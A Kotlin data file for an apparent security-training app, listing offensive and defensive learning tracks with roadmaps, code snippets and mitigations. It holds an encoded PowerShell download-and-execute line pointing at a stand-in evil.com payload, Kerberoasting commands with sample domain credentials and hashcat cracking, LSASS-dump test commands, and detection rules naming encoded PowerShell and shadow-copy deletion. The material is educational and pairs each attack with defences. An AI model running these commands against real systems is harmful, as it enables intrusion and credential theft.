package com.example.data.learning

import androidx.compose.ui.graphics.Color
import com.example.data.model.TopicOfTheDay

data class RoadmapStage(
    val phaseNumber: Int,
    val title: String,
    val description: String,
    val toolsAndSkills: List<String>
)

data class LearningTrack(
    val id: String,
    val title: String,
    val roleBadge: String,
    val tagline: String,
    val themeColor: Color,
    val overview: String,
    val roadmapStages: List<RoadmapStage>,
    val practicalExampleTitle: String,
    val practicalExampleDescription: String,
    val handsOnCodeSnippet: String,
    val defensiveTakeaway: String
)

object LearningRepository {

    val tracks: List<LearningTrack> = listOf(
        LearningTrack(
            id = "mitre_attack",
            title = "MITRE ATT&CK Matrix",
            roleBadge = "Offensive TTP Specialist",
            tagline = "14 Enterprise Tactics, APT Behaviors & Adversary Emulation",
            themeColor = Color(0xFFF43F5E),
            overview = "Master all 14 enterprise tactics of the MITRE ATT&CK matrix: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact. Explore real-world offensive techniques, adversary simulation commands, and APT group tradecraft.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Reconnaissance & Initial Access (TA0043 & TA0001)",
                    "Active vulnerability scanning (T1595), public-facing service exploitation (T1190), spearphishing attachments (T1566), and external credential stuffing.",
                    listOf("T1595 Active Scanning", "T1190 Public Exploit", "T1566 Spearphishing", "Nuclei", "Nmap", "GoWitness")
                ),
                RoadmapStage(
                    2,
                    "Execution & Persistence (TA0002 & TA0003)",
                    "Command & scripting interpreters (T1059: PowerShell, bash, Python), Scheduled Tasks/Cron (T1053), autostart registry keys (T1547), and daemon service creation.",
                    listOf("T1059 Scripting Interpreters", "T1053 Scheduled Task", "T1547 Boot Autostart", "Atomic Red Team", "Empire")
                ),
                RoadmapStage(
                    3,
                    "Privilege Escalation & Defense Evasion (TA0004 & TA0005)",
                    "Process Injection & Hollowing (T1055), Masquerading (T1036), Impairing EDR defenses (T1562), and User Account Control (UAC) bypass techniques.",
                    listOf("T1055 Process Injection", "T1036 Masquerading", "T1562 Impair Defenses", "AMSI Bypass", "Token Impersonation")
                ),
                RoadmapStage(
                    4,
                    "Credential Access & Lateral Movement (TA0006 & TA0008)",
                    "OS Credential Dumping (T1003: LSASS, NTDS.dit, SAM), Kerberoasting & AS-REP Roasting (T1558), and Remote Services lateral execution (T1021: WinRM, RDP, SSH).",
                    listOf("T1003 LSASS Dump", "T1558 Kerberoasting", "T1021 Remote Services", "BloodHound", "Mimikatz")
                ),
                RoadmapStage(
                    5,
                    "C2, Exfiltration & Impact (TA0011, TA0010, TA0040)",
                    "Encrypted Application Layer C2 Beacons (T1071), Data Transfer to Cloud Storage (T1567), and Data Encrypted for Impact (T1486 ransomware execution).",
                    listOf("T1071 C2 Protocols", "T1567 Cloud Exfiltration", "T1486 Ransomware", "Sliver", "Mythic", "Cobalt Strike")
                )
            ),
            practicalExampleTitle = "T1059.001 PowerShell Encoded Execution Simulation",
            practicalExampleDescription = "Adversaries bypass command-line pattern matching by passing base64 encoded strings to powershell.exe (-EncodedCommand). This downloads and executes memory-only staging shells without touching disk.",
            handsOnCodeSnippet = """
# Offensive TTP Simulation: T1059.001 Base64 Encoded Download & Exec
powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2V2aWwuY29tL3BheWxvYWQucHMxJyk=

# Atomic Red Team Test T1059.001 execution test
Invoke-AtomicTest T1059.001 -TestNumbers 1 -ShowDetails
            """.trimIndent(),
            defensiveTakeaway = "Enforce PowerShell Constrained Language Mode, configure Script Block Logging (Event ID 4104), and monitor for non-standard parent-child process lineages (e.g. word.exe spawning powershell.exe)."
        ),
        LearningTrack(
            id = "mitre_defend",
            title = "MITRE D3FEND Matrix",
            roleBadge = "Defensive Matrix Architect",
            tagline = "Model-Driven Countermeasures, Detection & Hardening Knowledge Graph",
            themeColor = Color(0xFF06B6D4),
            overview = "Explore the NSA/MITRE D3FEND countermeasure knowledge graph. Learn to systematically construct defense-in-depth across Model, Harden, Detect, Isolate, and Deceive tactics. Map enterprise telemetry to Sigma detection rules, EDR behavioral hooks, YARA signatures, and automated threat containment.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Deceive & Model Tactics (D3-DEC & D3-MDL)",
                    "Decoy Credentials (D3-DC), Honeypot Systems (D3-HS), Network Decoy traffic, and System Dependency Mapping (D3-SDM) to mislead adversaries and detect early reconnaissance.",
                    listOf("D3-DC Decoy Credentials", "D3-HS Honeypots", "Canary Tokens", "D3-SDM System Mapping", "Deception Engineering")
                ),
                RoadmapStage(
                    2,
                    "Hardening & Attack Surface Reduction (D3-HRD)",
                    "Application Whitelisting (D3-AW), Driver Signing Enforcement (D3-DSE), Inbound Traffic Filtering (D3-ITF), and Credential Transmission Scoping (D3-CTS).",
                    listOf("D3-AW App Whitelisting", "D3-DSE Driver Verification", "AppLocker", "WDAC", "D3-ITF Inbound Filtering")
                ),
                RoadmapStage(
                    3,
                    "Detection Engineering & Telemetry (D3-DET)",
                    "Process Spawn Analysis (D3-PSA), Network Protocol Analysis (D3-NPA), File Access Pattern Analysis (D3-FAPA), and System Call Verification (D3-SCA).",
                    listOf("D3-PSA Process Analysis", "D3-NPA Protocol Analysis", "Sigma Rules", "Sysmon Event EID 1", "Auditd")
                ),
                RoadmapStage(
                    4,
                    "Isolation & Access Mediation (D3-ISO)",
                    "Process Sandboxing (D3-PS), Network Traffic Filtering (D3-NTF), Endpoint Access Mediation (D3-EAM), and Microsegmentation to contain lateral movement.",
                    listOf("D3-PS Sandboxing", "D3-NTF Microsegmentation", "D3-EAM Endpoint Mediation", "gVisor", "Cilium NetworkPolicy")
                ),
                RoadmapStage(
                    5,
                    "Eviction, Containment & Recovery (D3-EVC)",
                    "Credential Invalidation (D3-CI), Automated Host Isolation (D3-AHI), Process Termination (D3-PT), and Immutable Forensics/Backup restoration.",
                    listOf("D3-CI Credential Revocation", "D3-AHI Host Isolation", "EDR Containment", "Immutable Snapshots", "Velociraptor")
                )
            ),
            practicalExampleTitle = "D3-PSA Process Spawn Analysis via Sigma Rule",
            practicalExampleDescription = "D3FEND specifies Process Spawn Analysis (D3-PSA) to inspect process creation telemetry in real-time, decoding base64 argument buffers and flagging obfuscated command lines before malicious code executes.",
            handsOnCodeSnippet = """
# Defensive D3-PSA Countermeasure: Production Sigma Detection Rule
title: Suspicious PowerShell EncodedCommand Execution (D3-PSA)
id: d3fend-psa-t1059-001
status: production
description: Detects encoded PowerShell execution used to evade command-line string inspection.
references:
  - https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - ' -Enc '
      - ' -EncodedCommand '
      - ' -e '
  condition: selection
falsepositives:
  - Administrative deployment scripts using pre-encoded packages
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - d3fend.detect.process_spawn_analysis
            """.trimIndent(),
            defensiveTakeaway = "Integrate D3-PSA Sigma rules directly into your SIEM/EDR detection pipeline (Splunk, Elastic, Sentinel) to automatically trigger host quarantine on high-confidence matches."
        ),
        LearningTrack(
            id = "red_team",
            title = "Red Team",
            roleBadge = "Offensive Operator",
            tagline = "Adversary Emulation, Exploit Dev & Lateral Movement",
            themeColor = Color(0xFFEF4444),
            overview = "Red Teaming simulates sophisticated advanced persistent threats (APTs) to measure an organization's detection, response, and resilience capabilities under realistic attack scenarios.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Reconnaissance & Weaponization",
                    "OSINT gathering, external network asset mapping, credential stuffing analysis, and payload generation.",
                    listOf("RustScan", "Nmap", "Metasploit", "Amass", "Sublist3r")
                ),
                RoadmapStage(
                    2,
                    "Initial Access & Execution",
                    "Phishing attack vectors, weaponized document macros, public exploit weaponization, and initial shell establishment.",
                    listOf("GoPhish", "Villain", "PowerShell Empire", "Custom Stagers")
                ),
                RoadmapStage(
                    3,
                    "Active Directory Exploitation",
                    "Domain enumeration, Kerberoasting, AS-REP Roasting, BloodHound graph pathfinding, and DCSync credential harvesting.",
                    listOf("BloodHound", "Impacket", "Mimikatz", "Rubeus", "Certipy")
                ),
                RoadmapStage(
                    4,
                    "Evasion, Persistence & C2",
                    "AMSI and ETW bypasses, in-memory process hollowing, custom Command and Control (C2) listeners, and covert DNS tunneling.",
                    listOf("Sliver C2", "Havoc", "Mythic", "Donut", "SysWhispers")
                )
            ),
            practicalExampleTitle = "Active Directory Kerberoasting Attack Walkthrough",
            practicalExampleDescription = "Attackers with standard domain user credentials request Service Principal Name (SPN) tickets encrypted with the service account password hash, then crack them offline without alerting domain controllers.",
            handsOnCodeSnippet = """
# 1. Query Active Directory for service accounts with SPNs using Impacket
GetUserSPNs.py -request -dc-ip 10.10.10.1 corp.local/johndoe:Password123

# 2. Crack captured TGS hash offline with Hashcat dictionary attack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
            """.trimIndent(),
            defensiveTakeaway = "Enforce Group Managed Service Accounts (gMSA) with 120-character auto-rotated passwords and configure Honeytokens to detect SPN requests."
        ),
        LearningTrack(
            id = "blue_team",
            title = "Blue Team",
            roleBadge = "Defensive Operator / SOC",
            tagline = "SOC Operations, Detection Engineering & Incident Response",
            themeColor = Color(0xFF38BDF8),
            overview = "Blue Teams defend organizational assets through 24/7 telemetry monitoring, threat hunting, detection rule creation (Sigma/YARA), and rapid incident containment.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Telemetry & Log Pipeline Engineering",
                    "Centralizing Windows Event Logs (4688, 4624, 7045), Sysmon telemetry, Zeek network logs, and firewall traffic into SIEM clusters.",
                    listOf("Sysmon", "Elasticsearch", "Splunk", "Zeek", "Suricata")
                ),
                RoadmapStage(
                    2,
                    "Detection Engineering & Sigma Rule Authoring",
                    "Translating adversary TTPs into vendor-agnostic Sigma rules and MITRE ATT&CK detections.",
                    listOf("Sigma", "YARA-L", "KQL", "Splunk SPL", "CyberChef")
                ),
                RoadmapStage(
                    3,
                    "Incident Response & Triage (IR)",
                    "Live system triage, endpoint isolation, volatile memory dumps, and malicious scheduled task cleanup.",
                    listOf("KAPE", "Velociraptor", "Volatility 3", "FTK Imager")
                ),
                RoadmapStage(
                    4,
                    "Threat Hunting & Digital Forensics (DFIR)",
                    "Proactive hunting for living-off-the-land binaries (LOLBins), MFT file analysis, and persistence mechanism dismantling.",
                    listOf("Eric Zimmerman Tools", "Plaso", "Autopsy", "Ghidra")
                )
            ),
            practicalExampleTitle = "Hunting Ransomware Volume Shadow Deletion",
            practicalExampleDescription = "Ransomware operators invariably delete Volume Shadow Copies to prevent system rollback before encrypting user directories.",
            handsOnCodeSnippet = """
// Microsoft Sentinel / KQL Hunting Query for Shadow Copy Deletion
SecurityEvent
| where EventID == 4688
| where ProcessCommandLine has_any (
    "vssadmin delete shadows",
    "wbadmin delete catalog",
    "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
)
| project TimeGenerated, Computer, SubjectUserName, ProcessCommandLine
            """.trimIndent(),
            defensiveTakeaway = "Configure immutable backups and EDR tamper protection that immediately terminates unauthorized processes attempting volume manipulation."
        ),
        LearningTrack(
            id = "purple_team",
            title = "Purple Team",
            roleBadge = "Emulation & Gap Analyst",
            tagline = "Continuous Threat-Informed Defense & Atomic Testing",
            themeColor = Color(0xFFA855F7),
            overview = "Purple Teaming combines Red Team adversary techniques with Blue Team detection feedback, closing defensive blind spots in continuous iterative test cycles.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Adversary Emulation Planning",
                    "Selecting relevant threat groups (e.g. APT29, FIN7) and building emulation plans mapped to MITRE ATT&CK Navigator.",
                    listOf("MITRE ATT&CK", "Tidal Cyber", "Threat Intel Feeds")
                ),
                RoadmapStage(
                    2,
                    "Atomic Execution Testing",
                    "Executing unit tests for specific TTPs in controlled environments to evaluate SIEM/EDR detection fidelity.",
                    listOf("Atomic Red Team", "Caldera", "SCYTHE", "Stratus Red Team")
                ),
                RoadmapStage(
                    3,
                    "Detection Gap Analysis & Metrics",
                    "Measuring Mean Time to Detect (MTTD), Mean Time to Respond (MTTR), and detection visibility scoring.",
                    listOf("DeTT&CT", "VECTR", "AttackIQ")
                ),
                RoadmapStage(
                    4,
                    "Automated Purple Pipeline",
                    "Integrating recurring atomic tests into staging environments to ensure regressions don't break detection alerts.",
                    listOf("GitHub Actions", "Terraform", "Prelude Operator")
                )
            ),
            practicalExampleTitle = "Simulating T1003.001 LSASS Memory Dump",
            practicalExampleDescription = "Verify whether your EDR detects and prevents credential theft attempts against the Local Security Authority Subsystem Service (LSASS).",
            handsOnCodeSnippet = """
# Run Atomic Red Team Test T1003.001 (LSASS memory dump simulation)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Verify detection alerts triggered in your SIEM/EDR within 60 seconds
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10}
            """.trimIndent(),
            defensiveTakeaway = "Enable Windows Defender Credential Guard (LSA Protection) and configure ASR rules blocking LSASS process access."
        ),
        LearningTrack(
            id = "devsecops",
            title = "DevSecOps (Security Architect)",
            roleBadge = "Pipeline & AppSec Architect",
            tagline = "Shift-Left Pipeline Hardening, IaC & Supply Chain Security",
            themeColor = Color(0xFF10B981),
            overview = "DevSecOps integrates security into continuous integration and continuous deployment pipelines, enforcing automated vulnerability gates without slowing developer velocity.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Shift-Left SAST & Dependency SCA",
                    "Automating static code analysis and Software Composition Analysis (SCA) to reject known CVEs before pull requests merge.",
                    listOf("Semgrep", "Snyk", "Trivy", "Dependabot", "Grype")
                ),
                RoadmapStage(
                    2,
                    "Infrastructure as Code (IaC) Security",
                    "Validating Terraform, OpenTofu, Kubernetes manifests, and CloudFormation against CIS Benchmarks.",
                    listOf("Checkov", "tfsec", "KICS", "Terrascan", "TFLint")
                ),
                RoadmapStage(
                    3,
                    "Secrets Hygiene & Supply Chain Provenance",
                    "Detecting hardcoded tokens, generating Software Bill of Materials (SBOM), and signing container images with Cosign.",
                    listOf("GitGuardian", "Trufflehog", "Cosign", "Syft", "SLSA Framework")
                ),
                RoadmapStage(
                    4,
                    "Threat Modeling & Architecture Baselines",
                    "Conducting STRIDE threat modeling on microservices and implementing zero-trust service mesh authentication.",
                    listOf("OWASP Threat Dragon", "OWASP ASVS", "Istio mTLS", "OpenID Connect")
                )
            ),
            practicalExampleTitle = "Automated Security Gate in GitHub Actions",
            practicalExampleDescription = "Enforce automated vulnerability scanning on pull requests, failing the build if high or critical severity CVEs exist in dependencies.",
            handsOnCodeSnippet = """
# .github/workflows/security.yml
name: DevSecOps Security Gate
on: [pull_request]
jobs:
  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan Vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'
          exit-code: '1' # Fails PR build if vulnerabilities detected
            """.trimIndent(),
            defensiveTakeaway = "Shift security left so vulnerabilities are discovered and remediated in developer IDEs and PRs before reaching cloud clusters."
        ),
        LearningTrack(
            id = "cloud_security",
            title = "Cloud Security",
            roleBadge = "Cloud Security Architect",
            tagline = "Zero-Trust Cloud Architecture, IAM & Container Hardening",
            themeColor = Color(0xFFF59E0B),
            overview = "Cloud Security focuses on protecting cloud-native infrastructure across AWS, Azure, and GCP through least-privilege IAM, posture management, and runtime container isolation.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Cloud IAM Least Privilege & CIEM",
                    "Eliminating wildcard roles, implementing AWS IAM Permission Boundaries, and enforcing short-lived OIDC federation.",
                    listOf("AWS IAM", "GCP Workload Identity", "Azure RBAC", "Prowler")
                ),
                RoadmapStage(
                    2,
                    "Kubernetes & Container Hardening",
                    "Enforcing Kubernetes Pod Security Standards, admission controllers (Kyverno/OPA), and non-root container profiles.",
                    listOf("Kyverno", "OPA Gatekeeper", "Seccomp", "AppArmor")
                ),
                RoadmapStage(
                    3,
                    "Cloud Security Posture Management (CSPM)",
                    "Continuous automated auditing of cloud assets against CIS Cloud Benchmarks, detecting publicly open S3 buckets and unencrypted volumes.",
                    listOf("ScoutSuite", "Wiz", "Prisma Cloud", "Cloud Custodian")
                ),
                RoadmapStage(
                    4,
                    "Runtime Defense & eBPF Telemetry",
                    "Kernel-level monitoring of container breakouts, unauthorized socket connections, and reverse shells in live clusters.",
                    listOf("Falco", "Tetragon", "Cilium", "AWS GuardDuty")
                )
            ),
            practicalExampleTitle = "Kubernetes Admission Policy Blocking Privileged Pods",
            practicalExampleDescription = "Deploy a Kyverno admission rule that automatically rejects any Pod attempting to run with root/privileged host access.",
            handsOnCodeSnippet = """
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-privileged-containers
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-privileged-flag
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "Privileged containers are strictly forbidden in production!"
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: false
            """.trimIndent(),
            defensiveTakeaway = "Use admission controllers and runtime eBPF agents to guarantee that even compromised developer credentials cannot deploy host-level root exploits."
        )
    )

    val topicsOfTheDay: List<TopicOfTheDay> = listOf(
        TopicOfTheDay(
            id = "topic_slsa",
            title = "Software Supply Chain Security & SLSA Framework",
            category = "DevSecOps & Supply Chain",
            summary = "Supply chain attacks target build systems rather than production directly. The SLSA (Supply-chain Levels for Software Artifacts) framework provides incremental standards to verify provenance and prevent pipeline tampering.",
            attackVector = "Attackers inject backdoors into build runners or compromised open-source packages (e.g. SolarWinds, XZ backdoor), causing authentic-looking signed binaries to carry malware.",
            defenseStrategy = "Enforce SLSA Level 3: isolated ephemeral build environments, cryptographic artifact signing with Cosign, and strict build provenance generation.",
            practicalExample = "Generate cryptographic provenance in GitHub Actions using slsa-framework/slsa-github-generator and verify with `cosign verify-attestation`.",
            keyTakeaways = listOf(
                "Pin dependencies to full commit SHAs, never mutable tags.",
                "Build on isolated ephemeral runners without internet access during compile.",
                "Require cryptographic signatures on all release artifacts."
            )
        ),
        TopicOfTheDay(
            id = "topic_zero_trust",
            title = "Zero Trust Architecture (NIST SP 800-207)",
            category = "Architecture & Identity",
            summary = "Zero Trust eliminates implicit trust based on network location. Every request—internal or external—must be explicitly authenticated, authorized, and continuously validated.",
            attackVector = "Perimeter breaches (VPN, compromised employee laptop) traditionally allowed attackers to move laterally across internal subnets without re-authenticating.",
            defenseStrategy = "Enforce micro-segmentation, mutual TLS (mTLS), device health posture checks, and continuous risk-based token evaluation.",
            practicalExample = "Implement Service Mesh (Istio/Linkerd) requiring SPIFFE identity verification between every microservice call.",
            keyTakeaways = listOf(
                "Never trust, always verify.",
                "Assume breach: minimize blast radius with microsegmentation.",
                "Identity and context are the new security perimeters."
            )
        ),
        TopicOfTheDay(
            id = "topic_k8s_rce",
            title = "Kubernetes Ingress RCE & Annotation Injection",
            category = "Cloud & Kubernetes",
            summary = "Ingress controllers generate reverse-proxy configuration templates. Improper sanitation of snippet annotations allows attackers with tenant ingress access to escape namespace boundaries.",
            attackVector = "Users with RBAC rights to create Ingress resources insert malicious Lua scripts or config directives in `configuration-snippet` annotations.",
            defenseStrategy = "Disable snippet annotations globally (`controller.allowSnippetAnnotations: false`) and enforce admission controllers.",
            practicalExample = "Audit ingress controller Helm values and deploy Kyverno policy banning `nginx.ingress.kubernetes.io/configuration-snippet`.",
            keyTakeaways = listOf(
                "Multi-tenant clusters require strict validation on all annotation fields.",
                "Restrict RBAC for Ingress creation to automated deployment service accounts.",
                "Upgrade ingress-nginx to modern releases where snippet annotations are disabled by default."
            )
        )
    )

    fun getDailyTopic(): TopicOfTheDay {
        val dayIndex = (System.currentTimeMillis() / (24 * 60 * 60 * 1000L)) % topicsOfTheDay.size
        return topicsOfTheDay[dayIndex.toInt()]
    }
}
